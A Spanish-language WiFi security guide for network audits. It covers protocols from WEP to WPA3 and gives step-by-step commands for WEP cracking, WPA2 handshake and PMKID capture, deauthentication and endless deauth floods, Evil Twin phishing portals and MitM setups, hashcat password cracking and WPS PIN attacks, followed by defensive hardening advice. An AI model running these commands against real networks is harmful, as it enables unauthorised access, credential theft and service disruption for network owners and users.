# Seguridad WiFi — Guía Completa

> Protocolos de seguridad inalámbrica, vectores de ataque y medidas de defensa. Fundamental para auditorías de red corporativa.

---

## Tabla de contenidos

1. [Evolución de los protocolos WiFi](#1-evolución-de-los-protocolos-wifi)
2. [WPA2 — El estándar actual](#2-wpa2--el-estándar-actual)
3. [WPA3 — La nueva generación](#3-wpa3--la-nueva-generación)
4. [Herramientas de auditoría WiFi](#4-herramientas-de-auditoría-wifi)
5. [Ataque: Captura del Handshake WPA2](#5-ataque-captura-del-handshake-wpa2)
6. [Ataque: PMKID (sin deauthentication)](#6-ataque-pmkid-sin-deauthentication)
7. [Ataque: Evil Twin / Rogue AP](#7-ataque-evil-twin--rogue-ap)
8. [Cracking de contraseñas](#8-cracking-de-contraseñas)
9. [Otros ataques WiFi](#9-otros-ataques-wifi)
10. [Defensa: Cómo proteger una red WiFi](#10-defensa-cómo-proteger-una-red-wifi)
11. [Cheat Sheet](#11-cheat-sheet)

---

## 1. Evolución de los protocolos WiFi

| Protocolo | Año | Cifrado | Estado | Seguridad |
|-----------|-----|---------|--------|-----------|
| **WEP** | 1997 | RC4 (débil) | Obsoleto | 🔴 Roto completamente — evitar |
| **WPA** | 2003 | TKIP | Obsoleto | 🟠 Vulnerable — no usar |
| **WPA2-Personal** | 2004 | CCMP (AES) | Actual | 🟡 Seguro si contraseña fuerte |
| **WPA2-Enterprise** | 2004 | CCMP + 802.1X | Actual | 🟢 Seguro para entornos corp. |
| **WPA3-Personal** | 2018 | SAE (Dragonfly) | Moderno | 🟢 Más seguro que WPA2 |
| **WPA3-Enterprise** | 2018 | AES-256 + SAE | Moderno | 🟢 Máxima seguridad |

### Por qué WEP es completamente inseguro

WEP usa RC4 con IVs (Initialization Vectors) de solo 24 bits que se repiten. Con herramientas como `aircrack-ng`, se puede crackear WEP **en minutos** capturando suficientes paquetes.

```bash
# Crackear WEP (solo para entornos propios o pruebas autorizadas)
# 1. Capturar IVs
airodump-ng --bssid MAC_AP -c CANAL -w wep_cap wlan0mon
# 2. Inyectar tráfico para generar más IVs
aireplay-ng -3 -b MAC_AP -h TU_MAC wlan0mon
# 3. Crackear cuando haya suficientes IVs (~50.000)
aircrack-ng wep_cap-01.cap
```

---

## 2. WPA2 — El estándar actual

### Proceso de autenticación WPA2-Personal (4-Way Handshake)

```
CLIENTE (Supplicant)              ACCESS POINT (Authenticator)
         │                                  │
         │◄──── EAPOL Message 1 ────────────│  AP envía ANonce
         │      (ANonce)                    │
         │                                  │
         │──── EAPOL Message 2 ────────────►│  Cliente envía SNonce + MIC
         │     (SNonce + MIC)               │  [Aquí se puede capturar el handshake]
         │                                  │
         │◄──── EAPOL Message 3 ────────────│  AP confirma, envía GTK cifrado
         │      (GTK cifrado + MIC)         │
         │                                  │
         │──── EAPOL Message 4 ────────────►│  Cliente confirma
         │     (ACK)                        │
         │                                  │
         │    [Conexión establecida]         │
```

### ¿Cómo se crackea WPA2?

El atacante **no puede descifrar el tráfico cifrado directamente**, pero puede:
1. Capturar el 4-way handshake (que contiene un hash derivado de la contraseña)
2. Hacer un **ataque de diccionario** o **fuerza bruta** contra ese hash offline

Por eso, una **contraseña larga y aleatoria** hace el cracking prácticamente imposible.

### Vulnerabilidad KRACK (CVE-2017-13077)

En 2017 se descubrió que el proceso de reinstalación de claves (Key Reinstallation Attack) era vulnerable en algunas implementaciones de WPA2. Parcheado en la mayoría de dispositivos modernos.

---

## 3. WPA3 — La nueva generación

### SAE — Simultaneous Authentication of Equals

WPA3 reemplaza el PSK (Pre-Shared Key) por **SAE** (también llamado Dragonfly), un protocolo de acuerdo de contraseñas resistente a ataques de diccionario offline.

**Ventajas de WPA3 sobre WPA2:**

| Característica | WPA2 | WPA3 |
|----------------|------|------|
| Handshake capturable offline | ✅ Sí | ❌ No |
| Ataque de diccionario offline | ✅ Posible | ❌ Imposible |
| Forward Secrecy | ❌ No | ✅ Sí |
| Protección de redes abiertas (OWE) | ❌ No | ✅ Sí |
| Resistencia a contraseñas débiles | ❌ Baja | ✅ Alta |

### Forward Secrecy

WPA3 usa claves de sesión efímeras: aunque alguien capture todo el tráfico cifrado hoy y descubra la contraseña en el futuro, **no podrá descifrar el tráfico pasado**.

### Limitaciones de WPA3

- No todos los dispositivos IoT y legacy lo soportan
- Modo **Transition Mode** (WPA2 + WPA3) para compatibilidad → expuesto a ataques de downgrade
- Ataque **Dragonblood** (2019): algunos AP vulnerables en la implementación de SAE (CVE-2019-9494)

---

## 4. Herramientas de auditoría WiFi

Todas disponibles en Kali Linux por defecto.

### Suite aircrack-ng

```bash
airmon-ng     # Gestión del modo monitor
airodump-ng   # Captura de paquetes WiFi
aireplay-ng   # Inyección de paquetes (deauth, etc.)
aircrack-ng   # Cracking de WEP y WPA/WPA2
```

### Otras herramientas

```bash
hashcat       # GPU cracking (mucho más rápido que aircrack para WPA)
hcxdumptool   # Captura optimizada para PMKID attack
hcxtools      # Conversión de capturas para hashcat
hostapd-wpe   # Evil Twin con WPA Enterprise
wifiphisher   # Evil Twin automatizado
bettercap     # Swiss Army Knife para MitM y WiFi
```

---

## 5. Ataque: Captura del Handshake WPA2

El ataque más clásico contra redes WPA2-Personal.

### Requisitos

- Tarjeta WiFi con soporte para modo monitor (Alfa Networks, Ralink, Atheros...)
- Kali Linux o similar

### Paso 1: Poner la tarjeta en modo monitor

```bash
# Ver interfaces WiFi disponibles
iwconfig

# Detener procesos que interfieren con el modo monitor
sudo airmon-ng check kill

# Activar modo monitor
sudo airmon-ng start wlan0
# → Crea la interfaz wlan0mon

# Verificar
iwconfig wlan0mon   # Debe mostrar Mode: Monitor
```

### Paso 2: Descubrir redes objetivo

```bash
# Escanear todas las redes cercanas
sudo airodump-ng wlan0mon

# Información mostrada:
# BSSID      = MAC del Access Point
# PWR        = Potencia de la señal (-30 muy cerca, -90 muy lejos)
# CH         = Canal WiFi (1-13 para 2.4GHz, 36-165 para 5GHz)
# ENC        = Tipo de cifrado (WEP, WPA, WPA2, WPA3)
# CIPHER     = Algoritmo (CCMP=AES, TKIP)
# AUTH       = Autenticación (PSK=contraseña, MGT=802.1X)
# ESSID      = Nombre de la red (SSID)
```

### Paso 3: Enfocar en la red objetivo

```bash
# Capturar solo en la red objetivo
sudo airodump-ng \
    -c CANAL \
    --bssid MAC_AP \
    -w captura \
    wlan0mon

# Ejemplo real:
sudo airodump-ng -c 6 --bssid A0:B1:C2:D3:E4:F5 -w captura wlan0mon

# Esperar hasta ver: WPA handshake: A0:B1:C2:D3:E4:F5 (arriba a la derecha)
# → Algún cliente debe conectarse/reconectarse a la red
```

### Paso 4: Forzar reconexión (deauthentication)

En lugar de esperar, se puede forzar a un cliente conectado a reconectarse:

```bash
# Abrir otra terminal (mientras airodump captura)
# Enviar paquetes deauth al cliente (o broadcast)

# Deauth a un cliente específico:
sudo aireplay-ng --deauth 5 -a MAC_AP -c MAC_CLIENTE wlan0mon

# Deauth broadcast (desconecta todos los clientes):
sudo aireplay-ng --deauth 5 -a MAC_AP wlan0mon

# -deauth 5 = enviar 5 paquetes deauth (ajustar si necesario)
# Cuando el cliente reconecte → airodump captura el handshake
```

### Paso 5: Verificar la captura

```bash
# Ver si el handshake está en el archivo
aircrack-ng captura-01.cap

# Resultado esperado:
# 1 handshake captured
# INDEX: 1   BSSID: A0:B1:C2:D3:E4:F5   ESSID: MiRed
```

---

## 6. Ataque: PMKID (sin deauthentication)

El ataque PMKID (descubierto en 2018 por Jens Steube, autor de hashcat) permite obtener un hash crackeable **sin necesidad de capturar un handshake completo** ni desconectar clientes.

El PMKID se puede obtener del primer frame EAPOL que envía el AP a cualquier cliente que intente conectarse.

```bash
# 1. Capturar PMKIDs de los APs cercanos
sudo hcxdumptool -o pmkid_cap.pcapng -i wlan0mon --enable_status=1

# 2. Convertir la captura al formato de hashcat
hcxpcapngtool -o pmkid_hashes.hc22000 pmkid_cap.pcapng

# 3. Crackear con hashcat (ver sección 8)
hashcat -m 22000 pmkid_hashes.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## 7. Ataque: Evil Twin / Rogue AP

Crear un punto de acceso falso que imita una red legítima para capturar credenciales o hacer MitM.

### Escenario 1: Captive Portal (phishing de contraseña WiFi)

```bash
# Con wifiphisher (automatizado)
sudo wifiphisher --essid "Red_Victima" -p firmware-upgrade

# El ataque:
# 1. Crea un AP gemelo con el mismo SSID
# 2. Hace deauth al AP legítimo
# 3. Los clientes se conectan al Evil Twin (sin contraseña)
# 4. Muestra una página falsa pidiendo la "clave WiFi para actualización de firmware"
# 5. La víctima introduce la contraseña → el atacante la captura
```

### Escenario 2: MitM completo

```bash
# Configurar hostapd para crear el AP falso
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=Red_Victima
hw_mode=g
channel=6
EOF

sudo hostapd /tmp/hostapd.conf &

# Configurar dnsmasq (DHCP y DNS para los clientes)
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0mon
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
EOF

sudo dnsmasq -C /tmp/dnsmasq.conf -d &

# Habilitar forwarding y NAT (para dar acceso a internet)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

## 8. Cracking de contraseñas

### aircrack-ng (CPU, basado en diccionario)

```bash
# Crackear con diccionario
aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap

# Especificar BSSID si hay múltiples redes en la captura
aircrack-ng -b A0:B1:C2:D3:E4:F5 -w /usr/share/wordlists/rockyou.txt captura-01.cap
```

### hashcat (GPU, mucho más rápido)

```bash
# Convertir la captura al formato de hashcat
hcxpcapngtool -o hash.hc22000 captura-01.cap

# Crackear WPA2 con GPU (modo 22000)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Con reglas (genera variaciones de las palabras del diccionario)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Fuerza bruta (solo contraseñas de 8 dígitos numéricos)
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Ver el progreso en tiempo real
hashcat -m 22000 hash.hc22000 rockyou.txt --status --status-timer=10

# Ver contraseñas crackeadas
hashcat -m 22000 hash.hc22000 --show
```

### ¿Por qué es difícil crackear WPA2 con contraseña fuerte?

```
Velocidad de hashcat (GPU RTX 3080): ~500.000 contraseñas/segundo para WPA2

Contraseña aleatoria de 12 caracteres (mayúsc + minúsc + dígitos + símbolos):
→ Espacio de búsqueda: 95^12 = 540.360.087.662.636.963 combinaciones
→ Tiempo medio: 540 cuatrillones / 500.000/s = 34 millones de años

Contraseña "password123":
→ Está en rockyou.txt → crackeada en < 1 segundo
```

---

## 9. Otros ataques WiFi

### DEAUTH Flood (DoS)

```bash
# Deshabilitar continuamente todos los clientes de una red
sudo aireplay-ng --deauth 0 -a MAC_AP wlan0mon
# 0 = envío infinito (Ctrl+C para parar)
```

### WPS PIN Attack

Si el router tiene WPS activo, se puede crackear el PIN de 8 dígitos (solo 11.000 combinaciones reales por el diseño del protocolo).

```bash
# Detectar APs con WPS
sudo wash -i wlan0mon

# Atacar el PIN WPS
sudo reaver -i wlan0mon -b MAC_AP -vv
sudo bully -b MAC_AP -c CANAL wlan0mon
# Puede tardar horas pero algunos routers no tienen protección de bloqueo
```

### SSID Oculto — No es seguridad

Los SSIDs ocultos simplemente no se transmiten en los beacons, pero aparecen en cuanto un cliente legítimo se conecta:

```bash
# Descubrir SSIDs ocultos
sudo airodump-ng wlan0mon   # Aparecen como <length: 0>
# En cuanto un cliente se conecte → el ESSID aparece en los probe requests
```

---

## 10. Defensa: Cómo proteger una red WiFi

### Medidas esenciales

**Protocolo:**
- ✅ Usar **WPA3-Personal** si todos los dispositivos lo soportan
- ✅ Si necesitas compatibilidad, usar **WPA2 + WPA3 Transition Mode** con contraseña fuerte
- ❌ Nunca usar WEP ni WPA (TKIP)
- ❌ Desactivar WPS (vulnerable por diseño)

**Contraseña:**
- ✅ **Mínimo 16 caracteres** aleatorios (letras, números, símbolos)
- ✅ Generada con un gestor de contraseñas (Bitwarden, KeePass...)
- ❌ Nunca usar el nombre de la empresa, dirección o datos personales
- ❌ Nunca reutilizar contraseñas de otros servicios

**Configuración del router:**
- ✅ Cambiar las credenciales de administración por defecto
- ✅ Mantener el firmware actualizado
- ✅ Deshabilitar UPnP si no es necesario
- ✅ Deshabilitar acceso remoto al panel de admin
- ✅ Habilitar el firewall del router
- ✅ Usar DNS sobre HTTPS (DoH) o DNS privado

**Red separada:**
- ✅ Crear una red de **invitados** separada con VLAN propia
- ✅ Los dispositivos IoT en la red de invitados (no en la red principal)
- ✅ Desactivar la comunicación entre dispositivos en la red de invitados

**Entornos corporativos:**
- ✅ Usar **WPA2/WPA3-Enterprise** con servidor RADIUS (802.1X)
- ✅ Certificados digitales por dispositivo
- ✅ WIDS (Wireless Intrusion Detection System)
- ✅ Monitorizar rogue APs y SSIDs que imiten la red corporativa

---

## 11. Cheat Sheet

```
══════════════════════════════════════════════════════════════
              SEGURIDAD WIFI — CHEAT SHEET
══════════════════════════════════════════════════════════════

MODO MONITOR
  sudo airmon-ng check kill              Matar procesos que interfieren
  sudo airmon-ng start wlan0             Activar modo monitor → wlan0mon
  sudo airmon-ng stop wlan0mon           Desactivar modo monitor

RECONOCIMIENTO
  sudo airodump-ng wlan0mon              Escanear todas las redes
  sudo airodump-ng -c CH --bssid MAC -w cap wlan0mon   Capturar handshake

DEAUTHENTICATION
  sudo aireplay-ng --deauth 5 -a MAC_AP wlan0mon       Broadcast deauth
  sudo aireplay-ng --deauth 5 -a MAC_AP -c MAC_CLI wlan0mon  Cliente específico

CAPTURA PMKID (sin deauth)
  sudo hcxdumptool -o cap.pcapng -i wlan0mon
  hcxpcapngtool -o hashes.hc22000 cap.pcapng

CRACKING
  aircrack-ng -w rockyou.txt captura-01.cap             CPU, diccionario
  hashcat -m 22000 hashes.hc22000 rockyou.txt           GPU, mucho más rápido
  hashcat -m 22000 hashes.hc22000 -a 3 ?d?d?d?d?d?d?d?d  Fuerza bruta

WPS
  sudo wash -i wlan0mon                 Detectar APs con WPS
  sudo reaver -i wlan0mon -b MAC -vv   Atacar PIN WPS

DEFENSA CLAVE
  WPA3 o WPA2 con contraseña aleatoria >= 16 caracteres
  Desactivar WPS
  Red separada para IoT e invitados
  WPA2-Enterprise (802.1X) para entornos corporativos

══════════════════════════════════════════════════════════════
```

---

## Referencias

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [hashcat WPA Wiki](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
- [PMKID Attack — Jens Steube](https://hashcat.net/forum/thread-7717.html)
- [Dragonblood — WPA3 Vulnerabilities](https://wpa3.mathyvanhoef.com/)
- [WiFi Alliance — WPA3 Specification](https://www.wi-fi.org/discover-wi-fi/security)
